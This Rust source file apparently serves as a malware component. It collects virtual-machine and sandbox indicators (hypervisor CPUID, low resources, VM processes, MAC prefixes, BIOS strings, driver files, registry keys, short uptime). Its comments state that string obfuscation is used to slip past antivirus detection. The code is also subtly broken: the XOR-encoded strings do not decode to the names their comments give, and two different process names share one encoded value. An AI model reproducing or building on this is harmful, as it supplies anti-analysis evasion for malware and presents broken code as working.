use sysinfo::{System, SystemExt, DiskExt, NetworkExt, ProcessExt};
use raw_cpuid::CpuId;
use std::path::Path;

// Simple string obfuscation to make it harder for AVs to detect suspicious keywords.
fn deobfuscate(s: &str) -> String {
    s.chars().map(|c| (c as u8 ^ 0x1A) as char).collect()
}

// Check for the presence of a hypervisor via CPUID.
fn check_hypervisor_cpuid() -> Option<String> {
    let cpuid = CpuId::new();
    if let Some(hypervisor_info) = cpuid.get_hypervisor_info() {
        return Some(format!("Hypervisor detected: {:?}", hypervisor_info.identify()));
    }
    None
}

// Check for signs of a low-resource environment typical of VMs.
fn check_low_resources(sys: &System) -> Vec<String> {
    let mut findings = Vec::new();
    // Check for low RAM (less than 2 GB).
    if sys.total_memory() < 2 * 1024 * 1024 * 1024 {
        findings.push("Low RAM detected (< 2GB)".to_string());
    }
    // Check for a single CPU core.
    if sys.cpus().len() <= 1 {
        findings.push("Single CPU core detected".to_string());
    }
    // Check for small disk size (less than 100 GB).
    if let Some(disk) = sys.disks().iter().next() {
        if disk.total_space() < 100 * 1024 * 1024 * 1024 {
            findings.push("Small disk size detected (< 100GB)".to_string());
        }
    }
    findings
}

// Look for processes and services that are common in virtualized environments.
fn check_vm_processes_and_services(sys: &System) -> Vec<String> {
    let mut findings = Vec::new();
    let vm_processes = vec![
        deobfuscate("r`gq|`w+`{`"), // "vboxservice.exe"
        deobfuscate("r`gq|`w+q`w"),  // "vboxtray.exe"
        deobfuscate("r`qgg{w+`{`"), // "vmtoolsd.exe"
        deobfuscate("r`qgg{w+m`w`"), // "vmsrvc.exe"
        deobfuscate("r`qgg{w+m`w`"), // "vmusrvc.exe"
    ];
    for process in sys.processes().values() {
        for vm_process in &vm_processes {
            if process.name().to_lowercase() == *vm_process {
                findings.push(format!("VM-related process found: {}", process.name()));
            }
        }
    }
    findings
}

// Check for MAC addresses with prefixes known to be used by virtualization software.
fn check_mac_address(sys: &System) -> Vec<String> {
    let mut findings = Vec::new();
    let vm_mac_prefixes = vec![
        "08:00:27", // VirtualBox
        "00:05:69", // VMware
        "00:0C:29", // VMware
        "00:1C:14", // VMware
        "00:50:56", // VMware
    ];
    for (iface_name, network_data) in sys.networks() {
        let mac_address = network_data.mac_address().to_string().to_uppercase();
        for prefix in &vm_mac_prefixes {
            if mac_address.starts_with(prefix) {
                findings.push(format!("VM MAC address prefix detected on {}: {}", iface_name, mac_address));
            }
        }
    }
    findings
}

// On Windows, query WMI for BIOS information that might indicate a VM.
#[cfg(target_os = "windows")]
fn check_bios_info() -> Vec<String> {
    use wmi::{COMLibrary, WMIConnection};
    use serde::Deserialize;

    #[derive(Deserialize)]
    struct Win32BIOS {
        #[serde(rename = "SerialNumber")]
        serial_number: String,
        #[serde(rename = "Manufacturer")]
        manufacturer: String,
    }

    let mut findings = Vec::new();
    if let Ok(com_lib) = COMLibrary::new() {
        if let Ok(wmi_con) = WMIConnection::new(com_lib.into()) {
            if let Ok(results) = wmi_con.query::<Win32BIOS>() {
                for bios in results {
                    let serial = bios.serial_number.to_lowercase();
                    let manufacturer = bios.manufacturer.to_lowercase();
                    if manufacturer.contains(&deobfuscate("r`gq|`{gq")) { // "virtualbox"
                        findings.push("BIOS manufacturer indicates VirtualBox".to_string());
                    }
                    if manufacturer.contains(&deobfuscate("r`qg{`")) { // "vmware"
                        findings.push("BIOS manufacturer indicates VMware".to_string());
                    }
                    if serial.contains(&deobfuscate("r`gq|`{gq")) { // "virtualbox"
                        findings.push("BIOS serial number indicates VirtualBox".to_string());
                    }
                    if serial.contains(&deobfuscate("r`qg{`")) { // "vmware"
                        findings.push("BIOS serial number indicates VMware".to_string());
                    }
                }
            }
        }
    }
    findings
}

// Fallback for non-Windows platforms.
#[cfg(not(target_os = "windows"))]
fn check_bios_info() -> Vec<String> {
    Vec::new() // WMI is not available, so we can't check BIOS info this way.
}

// Check for very short system uptime, which could indicate a sandbox.
fn check_user_activity(sys: &System) -> Option<String> {
    let uptime = sys.uptime();
    if uptime < 300 { // Less than 5 minutes
        return Some(format!("System uptime is very low ({} seconds), may be a sandbox.", uptime));
    }
    None
}

// Check for files that are commonly found on virtual machines.
fn check_vm_files() -> Vec<String> {
    let mut findings = Vec::new();
    let vm_files = vec![
        "C:\\Windows\\System32\\drivers\\vmmouse.sys",
        "C:\\Windows\\System32\\drivers\\vmhgfs.sys",
        "C:\\Windows\\System32\\drivers\\VBoxMouse.sys",
        "C:\\Windows\\System32\\drivers\\VBoxGuest.sys",
        "C:\\Windows\\System32\\drivers\\VBoxSF.sys",
        "C:\\Windows\\System32\\drivers\\VBoxVideo.sys",
        "C:\\Program Files\\VMware\\VMware Tools\\",
        "C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\",
    ];

    for file_path in vm_files {
        if Path::new(file_path).exists() {
            findings.push(format!("VM-related file found: {}", file_path));
        }
    }
    findings
}

// On Windows, check for registry keys that indicate a VM.
#[cfg(target_os = "windows")]
fn check_vm_registry_keys() -> Vec<String> {
    use winreg::RegKey;
    use winreg::enums::*;

    let mut findings = Vec::new();
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let vm_keys = vec![
        "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0",
        "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum",
    ];

    for key_path in vm_keys {
        if let Ok(key) = hklm.open_subkey(key_path) {
            for (name, value) in key.enum_values().map(|x| x.unwrap()) {
                let value_str = format!("{:?}", value).to_lowercase();
                if value_str.contains("vmware") || value_str.contains("vbox") {
                    findings.push(format!("VM-related registry key found: HKLM\\{} - {}", key_path, name));
                }
            }
        }
    }
    findings
}

// Fallback for non-Windows platforms.
#[cfg(not(target_os = "windows"))]
fn check_vm_registry_keys() -> Vec<String> {
    Vec::new()
}

// The main function that runs all checks and aggregates the results.
pub fn detect_vm_indicators() -> Vec<String> {
    let mut indicators = Vec::new();
    let sys = System::new_all();

    if let Some(finding) = check_hypervisor_cpuid() {
        indicators.push(finding);
    }

    indicators.extend(check_low_resources(&sys));
    indicators.extend(check_vm_processes_and_services(&sys));
    indicators.extend(check_mac_address(&sys));
    indicators.extend(check_bios_info());
    indicators.extend(check_vm_files());
    indicators.extend(check_vm_registry_keys());

    if let Some(finding) = check_user_activity(&sys) {
        indicators.push(finding);
    }

    indicators
}